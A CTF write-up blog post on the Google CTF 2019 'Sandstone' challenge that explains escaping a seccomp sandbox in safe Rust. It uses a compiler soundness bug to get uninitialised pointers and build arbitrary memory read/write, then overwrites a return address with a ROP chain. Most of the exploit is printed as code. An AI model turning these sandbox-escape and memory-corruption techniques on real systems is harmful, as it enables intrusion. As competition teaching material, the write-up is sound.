---
layout: post
title:  "Google CTF 2019 Quals: Sandstone (sandbox, 8 solves)"
date:   2019-06-24 16:00:00 +0100
categories: [writeup]
tags: [writeups, pwn, rust, seccomp, sandbox]
---

*Author: Vtec234*

At 00:58 local time, two minutes before the end of the qualifiers for Google CTF 2019, drenched in sweat and shaking, I launched my exploit.

Time: T-90s \| Remote is compiling my code, sloooowllllly.

Time: T-60s \| Hundreds of addresses scrolling in the pwntools shell - I forgot to remove the damn `println!`s.

Time: T-40s \| **IT WORKED**

![flag](/images/google19/sandstone/pwntools_flag.png)

Time: T-30s \| Flag submitted, [my team](https://cr0wn.uk) placed 16th[^3]. I ponder my life choices.

What follows is a story of how a misunderstanding of the Rust compiler was miraculously resolved at the last minute.

## The task
Like others in the sandbox category, this challenge involves escaping a restricted environment. The server is running a Rust binary, [the source for which](/static/google19/sandstone/main.rs) is given. The binary accepts some Rust code, splices it into a file while forbidding `unsafe` blocks[^1], and then compiles and runs that as the child under a `ptrace`-ing parent with strict `seccomp` rules - no opening files, no `execve`, etc. The rule that's most interesting to us is that when we execute syscall number `0x1337`, the parent will capture it and print the flag. So we need to somehow do that using only safe Rust code.

The author went out of his way to make this as difficult as possible. The `CARGO_TOMPL_TEMPLATE` only includes two crates - `libc` and `seccomp-sys`. The latter is all unsafe, and the source-splicer checks for `"libc"` strings, so we cannot use it. It also forbids uses of `!` (except in `print!`) and `#`, which means macros and compiler directives are out of the question (I don't think Unicode helps here, but who knows). This prevents us from bypassing the `seccomp` sandbox like in the [unintended solution](https://maltekraus.de/blog/ctf/english/2018/10/18/hack-lu.html) to [Rusty Codepad](https://w0y.at/writeup/2018/10/18/hacklu-ctf-2018-rusty-codepad.html) from Hack.lu CTF 2018.

Finally, Non-Lexical Lifetimes are enabled with `#![feature(nll)]`, which in practice means better checking of borrow lifetimes by the compiler. In particular, [rust-lang/rust#31287](https://github.com/rust-lang/rust/issues/31287), which I and others used to solve Rusty Codepad, doesn't work any more.

## The bug
From the challenge conditions, it seemed quite clear that I'd need a soundness bug in order to execute arbitrary code. The challenge archive includes a [Dockerfile](/static/google19/sandstone/Dockerfile), which has the exact Rust toolchain listed - `nightly-2019-05-18`. This being fairly new (`1.36`, while the current nightly at the time of writing is `1.37`), I realized that the right bug to use is likely still not fixed, so instead of checking release notes, it's better to look at the issue tracker.

Searching the Rust issue tracker for `I-unsound 💥`, I found [#61696](https://github.com/rust-lang/rust/issues/61696), which looked promising.[^2] I reused snippets from the tracker to come up with a PoC:
```rust
pub enum Void {}

pub enum E1 {
    V1 { f: bool },
    V2 { v: Void },
    V3,
    V4,
}

pub fn void_unwrap<T>(x: Result<T, Void>) -> T {
    match x {
        Ok(val) => val,
        // The compiler thinks this branch is unreachable,
        // because the Void type has no inhabitants, so
        // it should be impossible to produce a value
        // of type Void.
        Err(v) => match v {}
    }
}

/// Makes a value of any type out of thin air.
pub fn mk_any<T>() -> T {
    match (E1::V1 { f: true }) {
        // The actual bug happens here - instead of going
        // into the loop below as it should, control flow
        // matches E1::V1 with E1::V2 and extracts a v: Void.
        E1::V2 { v } => {
            void_unwrap(Err(v))
        }
        _ => loop {}
    }
}
```
Using the function `mk_any` to instantiate a variable effectively leaves it uninitialized - it will reuse whatever value was already on the stack. With this in mind, an uninitialized pointer - `let mut b: Box<usize> = mk_any();` - *should* allow us to access arbitrary memory as long as we can force the stack frame to contain the right address. As it turned out, doing that is not at all so easy, but after writing the PoC I optimistically assumed the arbitrary read/write primitive would work, and went on to write the rest of the exploit.

## The easy-ish part
Assuming an arbitrary R/W in the form of two functions,
```rust
fn read(addr: usize) -> usize;
fn write(addr: usize, val: usize);
```
getting to `mov rax, 1337; syscall;` is simple - just overwrite the on-stack return address with a ROP chain. Although the right gadgets could (and probably do) appear in the binary, it's more convenient to force their existence by using them as immediates:
```rust
// mov rax, 0x1337; ret
// 0x48, 0xC7, 0xC0, 0x37, 0x13, 0x00, 0x00, 0xC3
let gadget1: usize = 0xc300001337c0c748;
// syscall;
// 0x0F, 0x05
let gadget2: usize = 0x050f;
// Use the gadgets in a side-effecting operation to prevent
// the compiler from optimizing them away. This is unnecessarily
// spammy - std::hint::black_box would be better, but is unstable.
println!("{:x} {:x}", gadget1, gadget2);
```
This will compile to, more or less, `mov rax, <gadget>;`, and since instructions are stored in RX pages, we can call the gadgets. Directly referencing an offset from the function name wasn't working[^4], so to find the gadgets, I loop and search through the code section using `read`. After the CTF, the author hinted that the following also works, with no searching:
```rust
pub fn gadget1() -> u64 { 0xc300001337c0c748 }
let gadget1_addr = (gadget1 as *const u64) as usize;
```
Knowing these, I should be able to overwrite the return address of `$crate::main` (i.e. the "real" one, not the top-level one that Rust binaries have), right? Well, I would **if it had one**. For reasons I will explain in the next section, it would stubbornly end with a `ud2` instruction, which causes `SIGILL`. At that point, I (incorrectly) assumed that Rust does something like `exit()` at the end of `$crate::main` instead of using `ret`, implying I had to create an inner, legit stack frame with a `ret` in the epilogue.

This required more work than simply defining a separate `fn`. You see, my code was compiled using `cargo build --release`, which translates to `rustc -C opt-level=3`. The Rust compiler inlines functions **aggressively**. Forcing it not to do that without using `#[inline(never)]` (remember, no `#`s) involves some of possibly the jankiest Rust you will ever see:
```rust
fn main() {
    let addr: usize = main as *const _ as usize;

    // noinline_fn is called several times,
    // so that inlining it would quadruple
    // the code size in this part. Because
    // noinline_fn is already large, rustc/LLVM
    // decides not to inline it.
    noinline_fn(addr);

    // The entire exploit is done by the time
    // noinline_fn returns, so these will never
    // be called.
    noinline_fn(addr);
    noinline_fn(addr);
    noinline_fn(addr);
}

const MSB_MASK: usize = 0xff00000000000000;

/// Not inlined!
pub fn noinline_fn(addr: usize) {
    /* Do the actual exploit here. */

    // This is an opaque predicate, always true
    // for userspace addresses on x64, but rustc
    // doesn't know that, so the code after is
    // not eliminated as dead.
    if addr & MSB_MASK == 0 {
        return;
    }

    println!("zest");
    // Slight spelling changes to prevent the print statements
    // from folding into a loop, which would reduce the code size.
    // Only some are changed, I was in a hurry :/
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("tect");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("test");
    println!("tcst");
    println!("test");
    println!("test");
    println!("test");
    println!("tevt");
    println!("test");
}
```
By the way, I'm sure there are better ways to prevent inlining, but it works ¯\\\_(ツ)\_/¯.

At this point, it only remains to overwrite the return address:
```rust
let a: usize = 0xdeadbeef;
// Obtain a stack address.
let mut addr = &a as *const usize as usize;
println!("stack = {:x}", addr as usize);

let mut retn: usize = 0;
loop {
    addr += 1;
    // Pray that the only address on the stack pointing to the same
    // page as our shellcode is the return address into main.
    if read(addr) & 0xfffffffffffff000
        == movrax & 0xfffffffffffff000 {
        retn = addr;
        break;
    }
}
println!("retn @ {:x}", retn);

write(retn, movrax); // mov rax, 1337; ret;
write(retn+8, syscall); // syscall;

if ($opaque_predicate) {
    return;
}
```

## About that primitive..
I finished the above about 3 hours before the CTF ended. What remained was to turn the malformed `Box<usize>` into a working `read`/`write` implementation. Because the `mk_any()` call reuses existing stack contents, my intention was to have three functions:
- `read2(addr: usize) -> usize`, which **assuming the memory in which its stack frame is created has the right contents already**, will make a `Box` and dereference it to read memory. My initial, broken version looked more or less like so:
```rust
pub fn read2(addr: usize) -> usize {
    let b: Box<usize> = mk_any();

    let x = *b;
    if addr & MSB_MASK == 0 {
        // Make sure not to drop b, it's not actually
        // a valid heap allocation.
        std::mem::forget(b);
        return x;
    }

    /* noinline code */
}
```
- `stack_maker(addr: usize)`, which sets up the stack contents for `read2`:
```rust
pub fn stack_maker(addr: usize) {
    let local_arr: [usize; 8] = [
        addr,
        addr,
        addr,
        addr,
        addr,
        addr,
        addr,
        addr,
    ];
    // Use the array to prevent it being optimized out.
    println!("{:?}", local_arr[0]);

    /* noinline code */
}
```
- `read(addr: usize) -> usize`, which just calls `stack_maker` and then `read2`. Crucially, `stack_maker` and `read2` must not be inlined in order for the memory reuse trick to work, but `read` itself could be.

## UD2
After I implemented the above, all hell broke lose. I started running into increasingly bizarre issues - my opaque predicates going into the wrong branch, unexpected values popping out of nowhere, `SIGSEGV`s and messages like `"thread 'main' panicked at 'index out of bounds: the len is 94012078353104 but the index is 1'"` (I still don't know how this one is possible).

About an hour before the end, I found what I now think causes all this (but please do correct me if this is wrong). Remember that `ud2` I spotted in `$crate::main`? That's not how sane Rust works - it's a sign of **unreachable code**.
```rust
// assume v: Void
match v {};
// Everything past this point is unreachable.
```
The compiler performs unreachability analysis and marks *everything* after the call to `mk_any()` as "should never run". As a result, suffering. At this point, I resorted to performing random permutations on the source code in desperate hope one of them works - and somehow, this change to `read2` did:
```rust
let mut b: Box<usize> = mk_any();

// NOTE this part is _really_ sensitive to the compilation.
// Without the access to &b here, code following *b will
// be marked as unreachable and SIGILL at runtime.
println!("{:x}", &b as *const _ as usize);

let x = *b;
if addr & MSB_MASK == 0 {
    std::mem::forget(b);
    return x;
}
```
I don't really know why (and probably don't want to), but if I were to guess, it would be that borrowing (i.e. creating a shared reference to) `b` forces the compiler to treat it as a valid value.

The solution is [here](/static/google19/sandstone/sploit.rs) and [here](/static/google19/sandstone/soln.py).

![no hope](/images/google19/sandstone/chat.png)

I guess the lesson here is either that sometimes not giving up is worth it, or that CTFs are an unhealthy, dangerous habit kids should stay away from. Huge thanks to [mlen](https://twitter.com/_mlen) for creating this fun, challenging task.

**Update (2019-06-28)**: [This blog post](http://blog.pnkfx.org/blog/2019/06/26/breaking-news-non-lexical-lifetimes-arrives-for-everyone) by a member of the Rust language team goes into detail on the impact of Non-Lexical Lifetimes.

[^1]: Actually the check for `"unsafe"` strings, present in the source, wasn't working on remote, but there is also a `#![forbid(unsafe_code)]` compiler directive in the template, so I couldn't use `unsafe`.

[^2]: After the CTF, it turned out that the intended solution was to use [#57893](https://github.com/rust-lang/rust/issues/57893). The flag lists [#31287](https://github.com/rust-lang/rust/issues/31287), but that's a typo - as I mentioned, it's been fixed by NLL.

[^3]: Up from 36th last year. By induction, in 2020 we'll be (-4)th.

[^4]: Turns out, `&main as *const _` and `main as *const u64` are not the same.
